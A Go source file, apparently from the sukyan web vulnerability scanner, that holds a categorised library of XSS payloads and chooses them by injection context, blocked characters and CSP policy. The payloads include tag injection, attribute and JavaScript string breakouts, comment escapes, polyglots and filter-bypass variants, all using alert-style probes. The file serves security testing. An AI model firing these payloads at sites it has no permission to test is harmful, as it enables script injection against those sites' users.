package payloads

import (
	"regexp"
	"strings"

	"github.com/pyneda/sukyan/pkg/http_utils"
	"github.com/pyneda/sukyan/pkg/scan/reflection"
)

// XSSPayloadCategory categorizes XSS payloads by their attack vector
type XSSPayloadCategory string

const (
	CategoryTagInjection      XSSPayloadCategory = "tag_injection"      // Inject new HTML tags
	CategoryAttributeBreaking XSSPayloadCategory = "attribute_breaking" // Break out of attributes
	CategoryJSBreaking        XSSPayloadCategory = "js_breaking"        // Break out of JS context
	CategoryEventHandler      XSSPayloadCategory = "event_handler"      // Event handler payloads
	CategoryURLScheme         XSSPayloadCategory = "url_scheme"         // javascript: and data: URLs
	CategoryPolyglot          XSSPayloadCategory = "polyglot"           // Works in multiple contexts
	CategoryCommentBreaking   XSSPayloadCategory = "comment_breaking"   // Break out of HTML comments
	CategoryCallbackBreaking  XSSPayloadCategory = "callback_breaking"  // Break out of JSONP/callback contexts
)

// XSSPayload extends GenericPayload with context awareness
type XSSPayload struct {
	BasePayload
	Value         string
	Categories    []XSSPayloadCategory
	EventType     string   // For event handler payloads (e.g., "onclick", "onfocus")
	RequiredChars []string // Characters that must pass through unchanged
	Confidence    int      // Base confidence score (1-100)
}

// GetValue returns the payload string
func (p XSSPayload) GetValue() string {
	return p.Value
}

// MatchAgainstString checks if the payload matches against a string
func (p XSSPayload) MatchAgainstString(text string) (bool, error) {
	return regexp.MatchString(regexp.QuoteMeta(p.Value), text)
}

// GetPayloadsForContext returns XSS payloads suitable for the given reflection analysis
func GetPayloadsForContext(analysis *reflection.ReflectionAnalysis) []PayloadInterface {
	return GetPayloadsForContextWithVariations(analysis, true)
}

// GetPayloadsForContextWithVariations returns XSS payloads with optional variation generation
func GetPayloadsForContextWithVariations(analysis *reflection.ReflectionAnalysis, enableVariations bool) []PayloadInterface {
	if analysis == nil || !analysis.IsReflected {
		return GetXSSPayloads() // Fall back to all payloads
	}

	var payloads []XSSPayload

	// Add payloads based on detected contexts
	for _, ctx := range analysis.Contexts {
		// Skip if in bad context
		if reflection.IsInBadContext(ctx.Position, analysis.BadContexts) != nil {
			continue
		}

		switch ctx.Mode {
		case reflection.ModeHTML:
			payloads = append(payloads, getHTMLContextPayloads(analysis)...)

		case reflection.ModeAttribute:
			payloads = append(payloads, getAttributeContextPayloads(analysis, ctx)...)

		case reflection.ModeScript:
			payloads = append(payloads, getScriptContextPayloads(analysis, ctx)...)

		case reflection.ModeComment:
			payloads = append(payloads, getCommentContextPayloads(analysis)...)

		case reflection.ModeCSS:
			payloads = append(payloads, getCSSContextPayloads(analysis)...)
		}
	}

	// Always include polyglot payloads
	payloads = append(payloads, getPolyglotPayloads()...)

	// Generate variations if enabled
	if enableVariations {
		varConfig := buildVariationConfig(analysis)
		payloads = GenerateBulkVariations(payloads, varConfig)
	}

	// IMPORTANT: Deduplicate BEFORE filtering to avoid duplicate payloads
	payloads = DeduplicatePayloads(payloads)

	// Filter by character efficiencies
	filtered := filterByEfficiencies(payloads, analysis)

	// Convert to interface
	return convertToInterface(filtered)
}

// buildVariationConfig determines which variations to enable based on analysis
func buildVariationConfig(analysis *reflection.ReflectionAnalysis) VariationConfig {
	config := DefaultVariationConfig()

	// Enable backtick calls if parentheses blocked but backticks pass
	if !analysis.CanCallFunctions && analysis.CanUseBackticks {
		config.EnableBacktickCall = true
	}

	// Enable unicode/hex escapes for JS contexts
	for _, ctx := range analysis.Contexts {
		if ctx.Mode == reflection.ModeScript {
			config.EnableUnicodeJS = true
			config.EnableHexEscape = true
			break
		}
	}

	// Enable HTML entity variations for srcdoc context
	for _, ctx := range analysis.Contexts {
		if ctx.Mode == reflection.ModeAttribute {
			details := analysis.GetAttributeContextDetails(ctx.Position)
			if details != nil && strings.ToLower(details.Name) == "srcdoc" {
				// For srcdoc, we'd use the special context payloads instead
				break
			}
		}
	}

	return config
}

// getHTMLContextPayloads returns payloads for HTML text context
func getHTMLContextPayloads(analysis *reflection.ReflectionAnalysis) []XSSPayload {
	var payloads []XSSPayload

	// Tag injection payloads (require < and >)
	if analysis.CanInjectTags {
		payloads = append(payloads, []XSSPayload{
			{Value: `<script>alert(1)</script>`, Categories: []XSSPayloadCategory{CategoryTagInjection}, RequiredChars: []string{"<", ">"}, Confidence: 95},
			{Value: `<img src=x onerror=alert(1)>`, Categories: []XSSPayloadCategory{CategoryTagInjection, CategoryEventHandler}, EventType: "onerror", RequiredChars: []string{"<", ">", "="}, Confidence: 90},
			{Value: `<svg onload=alert(1)>`, Categories: []XSSPayloadCategory{CategoryTagInjection, CategoryEventHandler}, EventType: "onload", RequiredChars: []string{"<", ">", "="}, Confidence: 90},
			{Value: `<body onload=alert(1)>`, Categories: []XSSPayloadCategory{CategoryTagInjection, CategoryEventHandler}, EventType: "onload", RequiredChars: []string{"<", ">", "="}, Confidence: 85},
			{Value: `<iframe src="javascript:alert(1)">`, Categories: []XSSPayloadCategory{CategoryTagInjection, CategoryURLScheme}, RequiredChars: []string{"<", ">", `"`}, Confidence: 80},
			{Value: `<details open ontoggle=alert(1)>`, Categories: []XSSPayloadCategory{CategoryTagInjection, CategoryEventHandler}, EventType: "ontoggle", RequiredChars: []string{"<", ">", "="}, Confidence: 85},
			{Value: `<marquee onstart=alert(1)>`, Categories: []XSSPayloadCategory{CategoryTagInjection, CategoryEventHandler}, EventType: "onstart", RequiredChars: []string{"<", ">", "="}, Confidence: 75},
			{Value: `<video><source onerror=alert(1)>`, Categories: []XSSPayloadCategory{CategoryTagInjection, CategoryEventHandler}, EventType: "onerror", RequiredChars: []string{"<", ">", "="}, Confidence: 80},
			{Value: `<input onfocus=alert(1) autofocus>`, Categories: []XSSPayloadCategory{CategoryTagInjection, CategoryEventHandler}, EventType: "onfocus", RequiredChars: []string{"<", ">", "="}, Confidence: 85},
			{Value: `<select onfocus=alert(1) autofocus>`, Categories: []XSSPayloadCategory{CategoryTagInjection, CategoryEventHandler}, EventType: "onfocus", RequiredChars: []string{"<", ">", "="}, Confidence: 80},
			{Value: `<textarea onfocus=alert(1) autofocus>`, Categories: []XSSPayloadCategory{CategoryTagInjection, CategoryEventHandler}, EventType: "onfocus", RequiredChars: []string{"<", ">", "="}, Confidence: 80},
			// From legacy wordlist - exotic execution
			{Value: `<script>{onerror=alert}throw 1</script>`, Categories: []XSSPayloadCategory{CategoryTagInjection}, RequiredChars: []string{"<", ">", "{", "}"}, Confidence: 80},
			{Value: `<object data=javascript:alert(1)>`, Categories: []XSSPayloadCategory{CategoryTagInjection, CategoryURLScheme}, RequiredChars: []string{"<", ">", ":", "="}, Confidence: 75},
			// Close parent tags before injection
			{Value: `</textarea><script>alert(1)</script>`, Categories: []XSSPayloadCategory{CategoryTagInjection}, RequiredChars: []string{"<", ">", "/"}, Confidence: 85},
			{Value: `</input><script>alert(1)</script>`, Categories: []XSSPayloadCategory{CategoryTagInjection}, RequiredChars: []string{"<", ">", "/"}, Confidence: 85},
			{Value: `</noscript><script>alert(1)</script>`, Categories: []XSSPayloadCategory{CategoryTagInjection}, RequiredChars: []string{"<", ">", "/"}, Confidence: 80},
			{Value: `</script><script>alert(1)</script>`, Categories: []XSSPayloadCategory{CategoryTagInjection}, RequiredChars: []string{"<", ">", "/"}, Confidence: 90},
			{Value: `</script><svg onload=alert()>`, Categories: []XSSPayloadCategory{CategoryTagInjection, CategoryEventHandler}, EventType: "onload", RequiredChars: []string{"<", ">", "/", "="}, Confidence: 85},
			// iframe without quotes
			{Value: `<iframe/src=javascript:alert(1)>`, Categories: []XSSPayloadCategory{CategoryTagInjection, CategoryURLScheme}, RequiredChars: []string{"<", ">", "/", ":"}, Confidence: 75},
			// CSS animation/transition event handlers - auto-trigger without user interaction
			{Value: `<style>@keyframes x{}</style><div style="animation:x" onanimationend=alert(1)>`, Categories: []XSSPayloadCategory{CategoryTagInjection, CategoryEventHandler}, EventType: "onanimationend", RequiredChars: []string{"<", ">", "=", ":", "@"}, Confidence: 80},
			{Value: `<style>@keyframes x{}</style><div style="animation:x" onanimationstart=alert(1)>`, Categories: []XSSPayloadCategory{CategoryTagInjection, CategoryEventHandler}, EventType: "onanimationstart", RequiredChars: []string{"<", ">", "=", ":", "@"}, Confidence: 80},
			{Value: `<style>*{transition:color 1s}*:hover{color:red}</style><div ontransitionend=alert(1)>hover me</div>`, Categories: []XSSPayloadCategory{CategoryTagInjection, CategoryEventHandler}, EventType: "ontransitionend", RequiredChars: []string{"<", ">", "=", ":", "*"}, Confidence: 70},
		}...)
	}

	// Event handler only payloads (when we can inject tags but with limited chars)
	if analysis.CanInjectTags && analysis.CanUseEquals {
		payloads = append(payloads, []XSSPayload{
			{Value: `<img/src=x onerror=alert(1)>`, Categories: []XSSPayloadCategory{CategoryTagInjection, CategoryEventHandler}, EventType: "onerror", RequiredChars: []string{"<", ">", "=", "/"}, Confidence: 85},
			{Value: `<svg/onload=alert(1)>`, Categories: []XSSPayloadCategory{CategoryTagInjection, CategoryEventHandler}, EventType: "onload", RequiredChars: []string{"<", ">", "=", "/"}, Confidence: 85},
			{Value: `<svg/onload=confirm()>`, Categories: []XSSPayloadCategory{CategoryTagInjection, CategoryEventHandler}, EventType: "onload", RequiredChars: []string{"<", ">", "=", "/"}, Confidence: 85},
		}...)
	}

	return payloads
}

// getAttributeContextPayloads returns payloads for attribute context
func getAttributeContextPayloads(analysis *reflection.ReflectionAnalysis, ctx reflection.ReflectionContext) []XSSPayload {
	var payloads []XSSPayload

	// Get attribute details if available
	details := analysis.GetAttributeContextDetails(ctx.Position)

	// Double quote breaking
	if ctx.QuoteState == reflection.QuoteDouble && analysis.CanBreakDoubleQuote {
		payloads = append(payloads, []XSSPayload{
			{Value: `" onclick=alert(1) "`, Categories: []XSSPayloadCategory{CategoryAttributeBreaking, CategoryEventHandler}, EventType: "onclick", RequiredChars: []string{`"`, "="}, Confidence: 85},
			{Value: `" onfocus=alert(1) autofocus "`, Categories: []XSSPayloadCategory{CategoryAttributeBreaking, CategoryEventHandler}, EventType: "onfocus", RequiredChars: []string{`"`, "="}, Confidence: 85},
			{Value: `" onmouseover=alert(1) "`, Categories: []XSSPayloadCategory{CategoryAttributeBreaking, CategoryEventHandler}, EventType: "onmouseover", RequiredChars: []string{`"`, "="}, Confidence: 80},
			{Value: `"><script>alert(1)</script>`, Categories: []XSSPayloadCategory{CategoryAttributeBreaking, CategoryTagInjection}, RequiredChars: []string{`"`, ">", "<"}, Confidence: 90},
			{Value: `"><img src=x onerror=alert(1)>`, Categories: []XSSPayloadCategory{CategoryAttributeBreaking, CategoryTagInjection, CategoryEventHandler}, EventType: "onerror", RequiredChars: []string{`"`, ">", "<", "="}, Confidence: 90},
		}...)
	}

	// Single quote breaking
	if ctx.QuoteState == reflection.QuoteSingle && analysis.CanBreakSingleQuote {
		payloads = append(payloads, []XSSPayload{
			{Value: `' onclick=alert(1) '`, Categories: []XSSPayloadCategory{CategoryAttributeBreaking, CategoryEventHandler}, EventType: "onclick", RequiredChars: []string{`'`, "="}, Confidence: 85},
			{Value: `' onfocus=alert(1) autofocus '`, Categories: []XSSPayloadCategory{CategoryAttributeBreaking, CategoryEventHandler}, EventType: "onfocus", RequiredChars: []string{`'`, "="}, Confidence: 85},
			{Value: `' onmouseover=alert(1) '`, Categories: []XSSPayloadCategory{CategoryAttributeBreaking, CategoryEventHandler}, EventType: "onmouseover", RequiredChars: []string{`'`, "="}, Confidence: 80},
			{Value: `'><script>alert(1)</script>`, Categories: []XSSPayloadCategory{CategoryAttributeBreaking, CategoryTagInjection}, RequiredChars: []string{`'`, ">", "<"}, Confidence: 90},
			{Value: `'><img src=x onerror=alert(1)>`, Categories: []XSSPayloadCategory{CategoryAttributeBreaking, CategoryTagInjection, CategoryEventHandler}, EventType: "onerror", RequiredChars: []string{`'`, ">", "<", "="}, Confidence: 90},
		}...)
	}

	// Unquoted attribute
	if ctx.QuoteState == reflection.QuoteNone {
		payloads = append(payloads, []XSSPayload{
			{Value: ` onclick=alert(1) `, Categories: []XSSPayloadCategory{CategoryAttributeBreaking, CategoryEventHandler}, EventType: "onclick", RequiredChars: []string{"="}, Confidence: 80},
			{Value: ` onfocus=alert(1) autofocus `, Categories: []XSSPayloadCategory{CategoryAttributeBreaking, CategoryEventHandler}, EventType: "onfocus", RequiredChars: []string{"="}, Confidence: 80},
			{Value: `><script>alert(1)</script>`, Categories: []XSSPayloadCategory{CategoryAttributeBreaking, CategoryTagInjection}, RequiredChars: []string{">", "<"}, Confidence: 85},
		}...)
	}

	// Special handling for dangerous attributes
	if details != nil {
		switch strings.ToLower(details.Name) {
		case "href", "src", "action", "formaction":
			payloads = append(payloads, []XSSPayload{
				{Value: `javascript:alert(1)`, Categories: []XSSPayloadCategory{CategoryURLScheme}, RequiredChars: []string{":"}, Confidence: 90},
				{Value: `javascript:alert(document.domain)`, Categories: []XSSPayloadCategory{CategoryURLScheme}, RequiredChars: []string{":"}, Confidence: 90},
				{Value: `data:text/html,<script>alert(1)</script>`, Categories: []XSSPayloadCategory{CategoryURLScheme}, RequiredChars: []string{":", "<", ">"}, Confidence: 80},
			}...)
		case "srcdoc":
			payloads = append(payloads, []XSSPayload{
				{Value: `<script>alert(1)</script>`, Categories: []XSSPayloadCategory{CategoryTagInjection}, RequiredChars: []string{"<", ">"}, Confidence: 95},
				{Value: `<img src=x onerror=alert(1)>`, Categories: []XSSPayloadCategory{CategoryTagInjection, CategoryEventHandler}, EventType: "onerror", RequiredChars: []string{"<", ">", "="}, Confidence: 90},
			}...)
		case "style":
			payloads = append(payloads, []XSSPayload{
				{Value: `expression(alert(1))`, Categories: []XSSPayloadCategory{CategoryJSBreaking}, RequiredChars: []string{"(", ")"}, Confidence: 50},
			}...)
		}

		// Event handler attributes
		if analysis.IsEventHandlerAttribute(ctx.Position) {
			payloads = append(payloads, []XSSPayload{
				{Value: `alert(1)`, Categories: []XSSPayloadCategory{CategoryJSBreaking}, RequiredChars: []string{"(", ")"}, Confidence: 95},
				{Value: `alert(document.domain)`, Categories: []XSSPayloadCategory{CategoryJSBreaking}, RequiredChars: []string{"(", ")"}, Confidence: 95},
			}...)
		}
	}

	return payloads
}

// getScriptContextPayloads returns payloads for JavaScript context
func getScriptContextPayloads(analysis *reflection.ReflectionAnalysis, ctx reflection.ReflectionContext) []XSSPayload {
	var payloads []XSSPayload

	// Double quoted string context
	if ctx.QuoteState == reflection.QuoteDouble && analysis.CanBreakDoubleQuote {
		payloads = append(payloads, []XSSPayload{
			{Value: `";alert(1);//`, Categories: []XSSPayloadCategory{CategoryJSBreaking}, RequiredChars: []string{`"`, ";", "(", ")", "/"}, Confidence: 90},
			{Value: `"-alert(1)-"`, Categories: []XSSPayloadCategory{CategoryJSBreaking}, RequiredChars: []string{`"`, "-", "(", ")"}, Confidence: 85},
			{Value: `"*alert(1)*"`, Categories: []XSSPayloadCategory{CategoryJSBreaking}, RequiredChars: []string{`"`, "*", "(", ")"}, Confidence: 85},
			{Value: `"</script><script>alert(1)</script>`, Categories: []XSSPayloadCategory{CategoryJSBreaking, CategoryTagInjection}, RequiredChars: []string{`"`, "<", ">", "/"}, Confidence: 90},
			// Escaped quote attempt (from legacy wordlist)
			{Value: `\");alert(1);//`, Categories: []XSSPayloadCategory{CategoryJSBreaking}, RequiredChars: []string{`\`, `"`, ";", "(", ")", "/"}, Confidence: 80},
		}...)
	}

	// Single quoted string context
	if ctx.QuoteState == reflection.QuoteSingle && analysis.CanBreakSingleQuote {
		payloads = append(payloads, []XSSPayload{
			{Value: `';alert(1);//`, Categories: []XSSPayloadCategory{CategoryJSBreaking}, RequiredChars: []string{`'`, ";", "(", ")", "/"}, Confidence: 90},
			{Value: `'-alert(1)-'`, Categories: []XSSPayloadCategory{CategoryJSBreaking}, RequiredChars: []string{`'`, "-", "(", ")"}, Confidence: 85},
			{Value: `'*alert(1)*'`, Categories: []XSSPayloadCategory{CategoryJSBreaking}, RequiredChars: []string{`'`, "*", "(", ")"}, Confidence: 85},
			{Value: `'</script><script>alert(1)</script>`, Categories: []XSSPayloadCategory{CategoryJSBreaking, CategoryTagInjection}, RequiredChars: []string{`'`, "<", ">", "/"}, Confidence: 90},
			// From legacy wordlist
			{Value: `'-alert()-'`, Categories: []XSSPayloadCategory{CategoryJSBreaking}, RequiredChars: []string{`'`, "-", "(", ")"}, Confidence: 85},
			{Value: `'-alert()//'`, Categories: []XSSPayloadCategory{CategoryJSBreaking}, RequiredChars: []string{`'`, "-", "(", ")", "/"}, Confidence: 85},
			// Object/JSON context breaking
			{Value: `'}alert(1);{'`, Categories: []XSSPayloadCategory{CategoryJSBreaking, CategoryCallbackBreaking}, RequiredChars: []string{`'`, "}", ";", "{"}, Confidence: 80},
			{Value: `'}%0Aalert(1);%0A{'`, Categories: []XSSPayloadCategory{CategoryJSBreaking, CategoryCallbackBreaking}, RequiredChars: []string{`'`, "}", "%", "{"}, Confidence: 75},
			// String concatenation bypass (from legacy wordlist)
			{Value: `';window['ale'+'rt'](1);//`, Categories: []XSSPayloadCategory{CategoryJSBreaking}, RequiredChars: []string{`'`, ";", "[", "]", "+", "/"}, Confidence: 75},
		}...)
	}

	// Template literal context
	if ctx.QuoteState == reflection.QuoteBacktick && analysis.CanUseBackticks {
		payloads = append(payloads, []XSSPayload{
			{Value: "${alert(1)}", Categories: []XSSPayloadCategory{CategoryJSBreaking}, RequiredChars: []string{"$", "{", "}", "(", ")"}, Confidence: 95},
			{Value: "`-alert(1)-`", Categories: []XSSPayloadCategory{CategoryJSBreaking}, RequiredChars: []string{"`", "-", "(", ")"}, Confidence: 85},
		}...)
	}

	// Unquoted JS context (e.g., inside expression)
	if ctx.QuoteState == reflection.QuoteNone {
		payloads = append(payloads, []XSSPayload{
			{Value: `;alert(1);//`, Categories: []XSSPayloadCategory{CategoryJSBreaking}, RequiredChars: []string{";", "(", ")", "/"}, Confidence: 85},
			{Value: `;alert(1);`, Categories: []XSSPayloadCategory{CategoryJSBreaking}, RequiredChars: []string{";", "(", ")"}, Confidence: 85},
			{Value: `-alert(1)-`, Categories: []XSSPayloadCategory{CategoryJSBreaking}, RequiredChars: []string{"-", "(", ")"}, Confidence: 80},
			{Value: `</script><script>alert(1)</script>`, Categories: []XSSPayloadCategory{CategoryJSBreaking, CategoryTagInjection}, RequiredChars: []string{"<", ">", "/"}, Confidence: 90},
			// From legacy wordlist - comment closing
			{Value: `*/alert(1)//`, Categories: []XSSPayloadCategory{CategoryJSBreaking}, RequiredChars: []string{"*", "/", "(", ")"}, Confidence: 75},
			// Callback/array breaking (from legacy wordlist)
			{Value: `});alert(1);//`, Categories: []XSSPayloadCategory{CategoryJSBreaking, CategoryCallbackBreaking}, RequiredChars: []string{"}", ")", ";", "/"}, Confidence: 80},
			{Value: `]);alert(1);//`, Categories: []XSSPayloadCategory{CategoryJSBreaking, CategoryCallbackBreaking}, RequiredChars: []string{"]", ")", ";", "/"}, Confidence: 80},
			{Value: `");alert(1);//`, Categories: []XSSPayloadCategory{CategoryJSBreaking, CategoryCallbackBreaking}, RequiredChars: []string{`"`, ")", ";", "/"}, Confidence: 80},
		}...)
	}

	// Backtick function call variations (from legacy wordlist)
	if analysis.CanUseBackticks {
		payloads = append(payloads, []XSSPayload{
			{Value: "confirm``", Categories: []XSSPayloadCategory{CategoryJSBreaking}, RequiredChars: []string{"`"}, Confidence: 75},
			{Value: "(confirm``)", Categories: []XSSPayloadCategory{CategoryJSBreaking}, RequiredChars: []string{"`", "(", ")"}, Confidence: 75},
			{Value: "{confirm``}", Categories: []XSSPayloadCategory{CategoryJSBreaking}, RequiredChars: []string{"`", "{", "}"}, Confidence: 70},
			{Value: "[confirm``]", Categories: []XSSPayloadCategory{CategoryJSBreaking}, RequiredChars: []string{"`", "[", "]"}, Confidence: 70},
			{Value: "(((confirm)))``", Categories: []XSSPayloadCategory{CategoryJSBreaking}, RequiredChars: []string{"`", "(", ")"}, Confidence: 65},
		}...)
	}

	return payloads
}

// getCommentContextPayloads returns payloads for HTML comment context
func getCommentContextPayloads(analysis *reflection.ReflectionAnalysis) []XSSPayload {
	var payloads []XSSPayload

	// Comment breaking payloads
	payloads = append(payloads, []XSSPayload{
		{Value: `--><script>alert(1)</script><!--`, Categories: []XSSPayloadCategory{CategoryCommentBreaking, CategoryTagInjection}, RequiredChars: []string{"-", ">", "<"}, Confidence: 90},
		{Value: `--><img src=x onerror=alert(1)><!--`, Categories: []XSSPayloadCategory{CategoryCommentBreaking, CategoryTagInjection, CategoryEventHandler}, EventType: "onerror", RequiredChars: []string{"-", ">", "<", "="}, Confidence: 85},
		{Value: `--!><script>alert(1)</script><!--`, Categories: []XSSPayloadCategory{CategoryCommentBreaking, CategoryTagInjection}, RequiredChars: []string{"-", "!", ">", "<"}, Confidence: 85},
	}...)

	return payloads
}

// getCSSContextPayloads returns payloads for CSS context
func getCSSContextPayloads(analysis *reflection.ReflectionAnalysis) []XSSPayload {
	var payloads []XSSPayload

	// CSS context payloads (limited XSS potential)
	payloads = append(payloads, []XSSPayload{
		{Value: `</style><script>alert(1)</script>`, Categories: []XSSPayloadCategory{CategoryTagInjection}, RequiredChars: []string{"<", ">", "/"}, Confidence: 85},
		{Value: `</style><img src=x onerror=alert(1)>`, Categories: []XSSPayloadCategory{CategoryTagInjection, CategoryEventHandler}, EventType: "onerror", RequiredChars: []string{"<", ">", "/", "="}, Confidence: 80},
	}...)

	return payloads
}

// getPolyglotPayloads returns payloads that work in multiple contexts
func getPolyglotPayloads() []XSSPayload {
	return []XSSPayload{
		{Value: `jaVasCript:/*-/*'/*"/**/(/* */oNcLiCk=alert() )//`, Categories: []XSSPayloadCategory{CategoryPolyglot}, Confidence: 70},
		{Value: `'"-->]]>*/</script></style></title></textarea></noscript></template><svg onload=alert()>`, Categories: []XSSPayloadCategory{CategoryPolyglot}, Confidence: 75},
		{Value: `'"><img src=x onerror=alert(1)>`, Categories: []XSSPayloadCategory{CategoryPolyglot, CategoryTagInjection, CategoryEventHandler}, EventType: "onerror", RequiredChars: []string{`'`, `"`, ">", "<", "="}, Confidence: 80},
		{Value: `javascript:alert(1)//`, Categories: []XSSPayloadCategory{CategoryPolyglot, CategoryURLScheme}, RequiredChars: []string{":"}, Confidence: 75},
		// From legacy wordlist
		{Value: `"><svg onload=alert()>`, Categories: []XSSPayloadCategory{CategoryPolyglot, CategoryAttributeBreaking, CategoryTagInjection, CategoryEventHandler}, EventType: "onload", RequiredChars: []string{`"`, ">", "<", "="}, Confidence: 85},
		{Value: `"><svg onload=alert()><b attr="`, Categories: []XSSPayloadCategory{CategoryPolyglot, CategoryAttributeBreaking, CategoryTagInjection, CategoryEventHandler}, EventType: "onload", RequiredChars: []string{`"`, ">", "<", "="}, Confidence: 80},
		{Value: `<!--<img src="--><img src=x onerror=javascript:alert(1)//">`, Categories: []XSSPayloadCategory{CategoryPolyglot, CategoryCommentBreaking, CategoryTagInjection, CategoryEventHandler}, EventType: "onerror", RequiredChars: []string{"<", ">", "-", "=", ":"}, Confidence: 75},
		{Value: "<d3\"<\"/onclick=\"1>[confirm``]\"<\">z", Categories: []XSSPayloadCategory{CategoryPolyglot}, RequiredChars: []string{"<", ">", `"`, "`", "["}, Confidence: 65},
		// Unicode escape (from legacy wordlist)
		{Value: `<svg onload=z=co\u006efir\u006d,z()>`, Categories: []XSSPayloadCategory{CategoryPolyglot, CategoryTagInjection, CategoryEventHandler}, EventType: "onload", RequiredChars: []string{"<", ">", "=", `\`, "u"}, Confidence: 70},
		// Data URI
		{Value: `data:text/html,<script>prompt(1)</script>`, Categories: []XSSPayloadCategory{CategoryPolyglot, CategoryURLScheme}, RequiredChars: []string{":", "<", ">"}, Confidence: 70},
	}
}

// filterByEfficiencies removes payloads that require blocked characters
func filterByEfficiencies(payloads []XSSPayload, analysis *reflection.ReflectionAnalysis) []XSSPayload {
	if len(analysis.CharEfficiencies) == 0 {
		return payloads // No efficiency data, return all
	}

	// Build efficiency map
	effMap := make(map[string]int)
	for _, eff := range analysis.CharEfficiencies {
		effMap[eff.Char] = eff.Efficiency
	}

	var filtered []XSSPayload
	for _, payload := range payloads {
		if len(payload.RequiredChars) == 0 {
			filtered = append(filtered, payload)
			continue
		}

		// Check if all required characters can pass through
		allPass := true
		for _, char := range payload.RequiredChars {
			if eff, ok := effMap[char]; ok && eff < 100 {
				allPass = false
				break
			}
		}

		if allPass {
			filtered = append(filtered, payload)
		}
	}

	return filtered
}

// convertToInterface converts XSSPayload slice to PayloadInterface slice
func convertToInterface(payloads []XSSPayload) []PayloadInterface {
	result := make([]PayloadInterface, len(payloads))
	for i, p := range payloads {
		result[i] = p
	}
	return result
}

// GetContextAwareXSSPayloads is a convenience function that combines analysis and payload selection
func GetContextAwareXSSPayloads(analysis *reflection.ReflectionAnalysis) []PayloadInterface {
	return GetPayloadsForContext(analysis)
}

type CSPFilterResult struct {
	Payloads            []PayloadInterface
	OriginalCount       int
	FilteredCount       int
	InlineScriptBlocked int
	DataURIBlocked      int
	BlocksInline        bool
	AllowsData          bool
}

func GetCSPAwarePayloads(analysis *reflection.ReflectionAnalysis, csp *http_utils.CSPPolicy) []PayloadInterface {
	result := GetCSPAwarePayloadsWithDetails(analysis, csp)
	return result.Payloads
}

func GetCSPAwarePayloadsWithDetails(analysis *reflection.ReflectionAnalysis, csp *http_utils.CSPPolicy) CSPFilterResult {
	payloads := GetPayloadsForContext(analysis)

	if csp == nil {
		return CSPFilterResult{
			Payloads:      payloads,
			OriginalCount: len(payloads),
			FilteredCount: len(payloads),
		}
	}

	return filterPayloadsByCSP(payloads, csp)
}

func filterPayloadsByCSP(payloads []PayloadInterface, csp *http_utils.CSPPolicy) CSPFilterResult {
	result := CSPFilterResult{
		OriginalCount: len(payloads),
	}

	if csp == nil || csp.ReportOnly {
		result.Payloads = payloads
		result.FilteredCount = len(payloads)
		return result
	}

	result.BlocksInline = csp.BlocksInlineScripts()
	result.AllowsData = csp.AllowsData(http_utils.DirectiveScriptSrc)

	var filtered []PayloadInterface
	for _, p := range payloads {
		xssPayload, ok := p.(XSSPayload)
		if !ok {
			filtered = append(filtered, p)
			continue
		}

		if result.BlocksInline && isInlineScriptPayload(xssPayload) {
			result.InlineScriptBlocked++
			continue
		}

		if isDataURIPayload(xssPayload) && !result.AllowsData {
			result.DataURIBlocked++
			continue
		}

		filtered = append(filtered, p)
	}

	result.Payloads = filtered
	result.FilteredCount = len(filtered)
	return result
}

func isInlineScriptPayload(p XSSPayload) bool {
	return hasCategory(p, CategoryTagInjection) &&
		strings.Contains(strings.ToLower(p.Value), "<script>")
}

func isDataURIPayload(p XSSPayload) bool {
	return strings.HasPrefix(strings.ToLower(p.Value), "data:")
}

func hasCategory(p XSSPayload, cat XSSPayloadCategory) bool {
	for _, c := range p.Categories {
		if c == cat {
			return true
		}
	}
	return false
}
